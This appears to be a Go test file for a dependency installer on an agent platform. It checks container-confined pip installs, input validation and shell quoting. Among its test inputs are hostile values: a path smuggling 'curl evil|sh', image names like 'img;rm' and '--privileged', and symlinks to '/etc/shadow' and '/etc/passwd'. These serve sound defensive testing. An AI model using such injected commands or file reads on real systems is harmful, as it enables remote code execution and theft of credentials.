package install

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"vornik.io/vornik/internal/projectdeps"
)

// Project dependency provisioning design §8 (2026-09-25): dependencies are
// installed by the OPERATOR with `vornikctl deps install`, inside the agent
// image, never by the daemon. The old path ran `python3 -m pip install` on the
// daemon host, from a control-plane-editable config (the 2026-08-03 spawn
// ruling), with the host's Python: 3.14 on the reference host against the
// agent image's 3.12, so compiled wheels would not import in the container.

type call struct {
	name string
	args []string
}

// fakeRunner records every command and answers from a script keyed by the
// first argument after the program name ("image", "run").
type fakeRunner struct {
	calls   []call
	answers map[string]func(args []string) ([]byte, error)
}

func (f *fakeRunner) run(_ context.Context, name string, args ...string) ([]byte, error) {
	f.calls = append(f.calls, call{name, args})
	key := ""
	if len(args) > 0 {
		key = args[0]
	}
	if a, ok := f.answers[key]; ok {
		return a(args)
	}
	return nil, nil
}

func has(args []string, want ...string) bool {
	joined := "\x00" + strings.Join(args, "\x00") + "\x00"
	return strings.Contains(joined, "\x00"+strings.Join(want, "\x00")+"\x00")
}

func probeAnswer(triple string) func([]string) ([]byte, error) {
	return func([]string) ([]byte, error) { return []byte(triple + "\n"), nil }
}

func TestImageID_NeverPullsAndRefusesAnAbsentImage(t *testing.T) {
	f := &fakeRunner{answers: map[string]func([]string) ([]byte, error){
		"image": func([]string) ([]byte, error) { return nil, errors.New("no such image") },
	}}
	if _, err := ImageID(context.Background(), f.run, "evil.example/trojan:latest"); err == nil {
		t.Fatal("an image not present locally must be refused, never pulled")
	}
	if len(f.calls) != 1 || !has(f.calls[0].args, "image", "inspect") {
		t.Fatalf("only a local inspect may run: %+v", f.calls)
	}
}

func TestProbe_TripleAndRefusals(t *testing.T) {
	f := &fakeRunner{answers: map[string]func([]string) ([]byte, error){"run": probeAnswer("cpython-312 x86_64 glibc-2.39")}}
	got, err := Probe(context.Background(), f.run, "vornik-agent:latest")
	if err != nil || got != "cpython-312 x86_64 glibc-2.39" {
		t.Fatalf("probe = %q, %v", got, err)
	}
	a := f.calls[0].args
	for _, want := range [][]string{{"--pull=never"}, {"--network=none"}, {"--rm"}, {"--entrypoint", "python3"}} {
		if !has(a, want...) {
			t.Errorf("probe argv lacks %v: %v", want, a)
		}
	}
	// An image without a usable python3 (a config can name any local image).
	bad := &fakeRunner{answers: map[string]func([]string) ([]byte, error){
		"run": func([]string) ([]byte, error) { return []byte("exec: python3: not found"), errors.New("exit 127") },
	}}
	if _, err := Probe(context.Background(), bad.run, "alpine:3"); err == nil || !strings.Contains(err.Error(), "alpine:3") {
		t.Fatalf("a failed probe must refuse naming the image, got %v", err)
	}
}

func TestChooseInterpreter(t *testing.T) {
	triples := map[string]string{"a:1": "cpython-312 x86_64 glibc-2.39", "b:1": "cpython-312 x86_64 glibc-2.39"}
	f := &fakeRunner{answers: map[string]func([]string) ([]byte, error){
		"run": func(args []string) ([]byte, error) {
			for img, tr := range triples {
				if has(args, img) {
					return []byte(tr), nil
				}
			}
			return nil, errors.New("unknown image")
		},
	}}
	if got, err := ChooseInterpreter(context.Background(), f.run, []string{"a:1", "b:1"}); err != nil || got != "cpython-312 x86_64 glibc-2.39" {
		t.Fatalf("agreeing images: %q %v", got, err)
	}
	for _, other := range []string{"cpython-312 aarch64 glibc-2.39", "cpython-311 x86_64 glibc-2.39", "cpython-312 x86_64 musl-1.2"} {
		triples["b:1"] = other
		if _, err := ChooseInterpreter(context.Background(), f.run, []string{"a:1", "b:1"}); err == nil ||
			!strings.Contains(err.Error(), "a:1") || !strings.Contains(err.Error(), "b:1") {
			t.Errorf("%q vs the first must refuse naming both images, got %v", other, err)
		}
	}
}

func TestPipFetcher_Argv(t *testing.T) {
	lock := "/srv/ws/proj/requirements.lock"
	f := &fakeRunner{}
	if err := PipFetcher(f.run, "vornik-agent:latest", lock, "")(context.Background(), "/cache/.staging-1"); err != nil {
		t.Fatal(err)
	}
	a := f.calls[0].args
	for _, want := range [][]string{
		{"run"}, {"--rm"}, {"--pull=never"}, {"--userns=keep-id"},
		{"-v", "/srv/ws/proj/requirements.lock:/lock/requirements.lock:ro,z"}, {"-v", "/cache/.staging-1:/staging:rw,z"},
		{"--entrypoint", "python3", "--", "vornik-agent:latest", "-m", "pip", "install"},
		{"--require-hashes"}, {"--only-binary=:all:"},
		{"--target", "/staging/" + projectdeps.SiteDir}, {"--requirement", "/lock/requirements.lock"},
	} {
		if !has(a, want...) {
			t.Errorf("connected fetch argv lacks %v:\n%v", want, a)
		}
	}
	// --no-deps is gone on purpose: with --require-hashes pip then refuses a
	// dependency the lockfile does not pin, so an incomplete lockfile fails
	// loudly (review-20260925-0325 F8). And only the lockfile FILE is mounted,
	// never its directory, the project checkout (F2).
	for _, banned := range []string{"--network=none", "--no-index", "--no-deps", "/srv/ws/proj:/lock:ro,z"} {
		if has(a, banned) {
			t.Errorf("a connected install must not carry %s", banned)
		}
	}

	off := &fakeRunner{}
	if err := PipFetcher(off.run, "vornik-agent:latest", lock, "/mnt/wheels")(context.Background(), "/cache/.staging-2"); err != nil {
		t.Fatal(err)
	}
	b := off.calls[0].args
	for _, want := range [][]string{{"--network=none"}, {"-v", "/mnt/wheels:/wheels:ro,z"}, {"--no-index"}, {"--find-links", "/wheels"}, {"--only-binary=:all:"}} {
		if !has(b, want...) {
			t.Errorf("air-gapped fetch argv lacks %v:\n%v", want, b)
		}
	}
}

func TestPipFetcher_SurfacesPipsOwnDiagnostics(t *testing.T) {
	f := &fakeRunner{answers: map[string]func([]string) ([]byte, error){
		"run": func([]string) ([]byte, error) {
			return []byte("ERROR: Could not find a version that satisfies the requirement (only binary)"), errors.New("exit status 1")
		},
	}}
	err := PipFetcher(f.run, "img", "/p/requirements.lock", "")(context.Background(), t.TempDir())
	if err == nil || !strings.Contains(err.Error(), "only binary") {
		t.Fatalf("pip's diagnostic must reach the operator, got %v", err)
	}
}

func TestWheelhouseCommand(t *testing.T) {
	cmd := WheelhouseCommand("vornik-agent:latest", "/srv/ws/proj/requirements.lock")
	for _, want := range []string{"podman run", "--userns=keep-id", "'/srv/ws/proj/requirements.lock:/lock/requirements.lock:ro,z'", "-- 'vornik-agent:latest'", "pip download", "--only-binary=:all:", "--require-hashes", "-r /lock/requirements.lock", "-d /wheelhouse"} {
		if !strings.Contains(cmd, want) {
			t.Errorf("wheelhouse command lacks %q: %s", want, cmd)
		}
	}
	// Config-derived tokens are shell-quoted: the command is meant to be
	// pasted (review-20260925-0325 F4).
	evil := WheelhouseCommand("img", "/x;curl evil|sh;/requirements.lock")
	if !strings.Contains(evil, "'/x;curl evil|sh;/requirements.lock:/lock/requirements.lock:ro,z'") {
		t.Errorf("a hostile path must stay inside quotes: %s", evil)
	}
	if got := shellQuote("it's"); got != `'it'"'"'s'` {
		t.Errorf("shellQuote = %s", got)
	}
}

func TestMaterialise_MarkerPermissionsAndIdempotence(t *testing.T) {
	root := t.TempDir()
	store := projectdeps.NewStore(root)
	meta := projectdeps.MarkerMeta{Images: []string{"vornik-agent:latest"}, ImageIDs: map[string]string{"vornik-agent:latest": "sha256:abc"}, Interpreter: "cpython-312 x86_64 glibc-2.39"}
	fetches := 0
	fetch := func(_ context.Context, dir string) error {
		fetches++
		if err := os.MkdirAll(filepath.Join(dir, projectdeps.SiteDir, "pkg"), 0o700); err != nil {
			return err
		}
		return os.WriteFile(filepath.Join(dir, projectdeps.SiteDir, "pkg", "__init__.py"), []byte("x = 1\n"), 0o600)
	}
	path, err := Materialise(context.Background(), store, "pip-abc", fetch, meta)
	if err != nil {
		t.Fatal(err)
	}
	got, err := store.ReadMarker("pip-abc")
	if err != nil || got.Interpreter != meta.Interpreter || got.ImageIDs["vornik-agent:latest"] != "sha256:abc" || got.Key != "pip-abc" {
		t.Fatalf("marker = %+v, %v", got, err)
	}
	if _, err := os.Stat(filepath.Join(path, projectdeps.SiteCustomiseFile)); err != nil {
		t.Fatalf("sitecustomize.py must be written: %v", err)
	}
	err = filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		want := os.FileMode(0o644)
		if info.IsDir() {
			want = 0o755
		}
		if info.Mode().Perm() != want {
			t.Errorf("%s: mode %v, want %v (marker included)", p, info.Mode().Perm(), want)
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := Materialise(context.Background(), store, "pip-abc", fetch, meta); err != nil || fetches != 1 {
		t.Fatalf("an installed key is skipped without fetching: fetches=%d err=%v", fetches, err)
	}
}

func TestMaterialise_FailureLeavesNothing(t *testing.T) {
	root := t.TempDir()
	store := projectdeps.NewStore(root)
	_, err := Materialise(context.Background(), store, "pip-x", func(context.Context, string) error { return errors.New("boom") }, projectdeps.MarkerMeta{})
	if err == nil {
		t.Fatal("want the fetch error")
	}
	entries, _ := os.ReadDir(root)
	if len(entries) != 0 {
		t.Fatalf("a failed install must leave no key and no staging dir: %v", entries)
	}
}

func TestMaterialise_RefusesAnUnmarkedDirectory(t *testing.T) {
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, "pip-y"), 0o755); err != nil {
		t.Fatal(err)
	}
	_, err := Materialise(context.Background(), projectdeps.NewStore(root), "pip-y", func(context.Context, string) error { return nil }, projectdeps.MarkerMeta{})
	if !errors.Is(err, projectdeps.ErrCorruptMaterialisation) {
		t.Fatalf("want ErrCorruptMaterialisation, got %v", err)
	}
}

func TestCheckOwner(t *testing.T) {
	dir := t.TempDir()
	if err := CheckOwner(dir); err != nil {
		t.Fatalf("our own directory: %v", err)
	}
	if err := checkOwnerUID(dir, os.Getuid()+1); err == nil {
		t.Fatal("a caller that does not own the cache directory must be refused")
	}
	if err := CheckOwner(filepath.Join(dir, "absent")); err != nil {
		t.Fatalf("an absent directory is created by the install, not refused: %v", err)
	}
}

// An image reference comes from a control-plane-editable config and is passed
// to podman as a bare argument: a value it could read as an option must be
// refused before any command runs.
func TestValidImageRef(t *testing.T) {
	for _, ok := range []string{"vornik-agent:latest", "localhost/vornik-agent:2026.9.6", "ghcr.io/org/img@sha256:abc123"} {
		if err := ValidImageRef(ok); err != nil {
			t.Errorf("%q: %v", ok, err)
		}
	}
	for _, bad := range []string{"", "--privileged", "-v", "img latest", "img;rm", "img\n"} {
		if err := ValidImageRef(bad); err == nil {
			t.Errorf("%q must be refused", bad)
		}
		f := &fakeRunner{}
		if _, err := ImageID(context.Background(), f.run, bad); err == nil || len(f.calls) != 0 {
			t.Errorf("%q: ImageID must refuse before running anything (calls %v)", bad, f.calls)
		}
		if err := PipFetcher(f.run, bad, "/p/requirements.lock", "")(context.Background(), t.TempDir()); err == nil || len(f.calls) != 0 {
			t.Errorf("%q: the fetch must refuse before running anything", bad)
		}
	}
}

// The tree is bind-mounted into agent containers: a symlink that leaves it
// would resolve against the host, so it is refused; an inner link is fine; a
// console script keeps its execute bit (review-20260925-0325 F3, F6).
func TestMakeReadable_SymlinksAndExecBits(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, "site", "pkg"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "site", "pkg", "mod.py"), []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(dir, "site", "bin"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "site", "bin", "tool"), []byte("#!/bin/sh\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("pkg/mod.py", filepath.Join(dir, "site", "inner")); err != nil {
		t.Fatal(err)
	}
	if err := makeReadable(dir); err != nil {
		t.Fatalf("an inner symlink is fine: %v", err)
	}
	if info, _ := os.Stat(filepath.Join(dir, "site", "bin", "tool")); info.Mode().Perm() != 0o755 {
		t.Errorf("console script mode %v, want 0755", info.Mode().Perm())
	}
	if info, _ := os.Stat(filepath.Join(dir, "site", "pkg", "mod.py")); info.Mode().Perm() != 0o644 {
		t.Errorf("module mode %v, want 0644", info.Mode().Perm())
	}
	for name, target := range map[string]string{"abs": "/etc/shadow", "up": "../../../etc/passwd"} {
		d := t.TempDir()
		if err := os.Symlink(target, filepath.Join(d, name)); err != nil {
			t.Fatal(err)
		}
		if err := makeReadable(d); err == nil {
			t.Errorf("a symlink to %s must be refused", target)
		}
	}
}

// Every bind-mount source and the lockfile's confinement are checked in the
// installer itself, not only by the planner (review-20260925-0325 F2).
func TestMountSourcesAndLockfileConfinement(t *testing.T) {
	for _, bad := range []string{"relative/path", "/a/../b", "/a:b", "/a,b", "/a\nb"} {
		if err := validMountSource(bad); err == nil {
			t.Errorf("%q must be refused as a mount source", bad)
		}
		f := &fakeRunner{}
		if err := PipFetcher(f.run, "img", bad, "")(context.Background(), "/cache/.staging"); err == nil || len(f.calls) != 0 {
			t.Errorf("%q: the fetch must refuse before running anything", bad)
		}
	}
	if err := ConfinedLockfile("/srv/ws/proj", "/srv/ws/proj/requirements.lock"); err != nil {
		t.Errorf("inside: %v", err)
	}
	for _, outside := range []string{"/srv/ws/other/requirements.lock", "/srv/ws/requirements.lock", "/etc/passwd", "/srv/ws/proj"} {
		if err := ConfinedLockfile("/srv/ws/proj", outside); err == nil {
			t.Errorf("%s must be refused", outside)
		}
	}
}
